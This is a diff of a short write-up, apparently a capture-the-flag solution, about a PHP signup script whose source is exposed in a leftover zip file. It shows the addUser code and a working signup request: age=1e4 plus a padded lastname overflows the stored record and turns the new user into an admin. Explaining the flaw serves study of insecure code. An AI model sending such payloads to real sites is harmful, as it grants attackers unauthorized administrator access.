@@ -30,7 +30,6 @@ SignUp manager is a simple and easy to use script which allows new users to sign
 
 signupmanager.zip is not removed from web directory. Codes of signup function is interesting:
 ```
-```
 function addUser($username,$password,$age,$firstname,$lastname){
     $random_hash = md5( print_r($_SERVER,true).print_r($_POST,true).date("U").microtime().rand() );
     $line = '';
@@ -66,12 +65,10 @@ function buildUsers(){
     return $users;
 }
 ```
+let age *overflow*, then the last char will be 'Y'  
+```
 $age='1e4'
 intval('1e4')=10000 
-```
 action=signup&username=test&password=test&age=1e4&firstname=123&lastname=YYYYYYYYYYYYYYY
 ```
 then, test is a admin.
-
-
-
